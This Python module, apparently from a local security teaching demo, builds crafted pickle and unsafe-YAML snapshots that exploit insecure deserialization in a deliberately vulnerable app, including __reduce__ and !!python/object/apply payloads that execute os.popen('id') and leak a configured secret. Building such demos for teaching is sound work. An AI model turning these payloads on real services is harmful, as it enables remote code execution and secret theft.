"""Scripted attacker snapshots for the escalation ladder (LOCAL DEMO ONLY).

These build the small, fixed set of hand-crafted snapshots the escalation ladder
submits to the **vulnerable** app:

* a **forged** snapshot the service never issued (accepted with no integrity check,
  reconstructing an attacker-authored object);
* an **object-injection** snapshot that discloses the fictional integration secret
  (no command executed); and
* a **code-execution** snapshot that reaches ``os.popen('id')`` and the planted
  ``DEMO_SENTINEL`` — one for each of the two deserializers (``pickle`` and unsafe
  YAML).

This is a fixed teaching ladder, not a gadget-chain library or a payload fuzzer
(both out of scope). It must never run against anything but this demo's own local
container, and every payload executes only the single read-only command ``id``.
"""

from __future__ import annotations

import base64
import pickle
from typing import Any

from picklejack.config import APP_CONFIG

# A single expression that runs the read-only command `id` AND reads the app's
# planted DEMO_SENTINEL, so one payload proves both OS command execution and that
# in-container code reached application internals.
_RCE_EXPR = (
    "__import__('os').popen('id').read()"
    " + __import__('picklejack.config', fromlist=['DEMO_SENTINEL']).DEMO_SENTINEL"
)

# A benign-looking workspace the service never issued (forged: no integrity check).
_FORGED_WORKSPACE = {
    "workspace_name": "Forged by attacker",
    "panels": [{"title": "injected", "kind": "counter", "position": 1}],
    "filters": [],
}


class _SecretDisclosure:
    """Object injection: reconstructs to the app's integration secret (no command)."""

    def __reduce__(self) -> tuple[Any, tuple[Any, ...]]:
        return (getattr, (APP_CONFIG, "integration_secret"))


class _CodeExecution:
    """Reconstruction reaches os.popen('id') and the planted DEMO_SENTINEL."""

    def __reduce__(self) -> tuple[Any, tuple[Any, ...]]:
        return (eval, (_RCE_EXPR,))


def _b64(raw: bytes) -> str:
    return base64.b64encode(raw).decode()


# --- pickle snapshots (reconstructed with pickle.loads on the vulnerable app) ---


def forged_pickle_snapshot() -> str:
    """A pickle snapshot the service never issued, reconstructing an attacker dict."""
    return _b64(pickle.dumps(_FORGED_WORKSPACE))


def secret_pickle_snapshot() -> str:
    """A pickle object-injection snapshot that discloses the integration secret."""
    return _b64(pickle.dumps(_SecretDisclosure()))


def rce_pickle_snapshot() -> str:
    """A pickle __reduce__ snapshot reaching os.popen('id') and DEMO_SENTINEL."""
    return _b64(pickle.dumps(_CodeExecution()))


# --- YAML snapshots (reconstructed with the object-constructing yaml.load) ---


def secret_yaml_snapshot() -> str:
    """An unsafe-YAML object-injection snapshot that discloses the secret."""
    return (
        "!!python/object/apply:getattr\n"
        "- !!python/name:picklejack.config.APP_CONFIG\n"
        "- integration_secret\n"
    )


def rce_yaml_snapshot() -> str:
    """An unsafe-YAML !!python/object/apply snapshot reaching os.popen('id')."""
    return f'!!python/object/apply:eval\n- "{_RCE_EXPR}"\n'
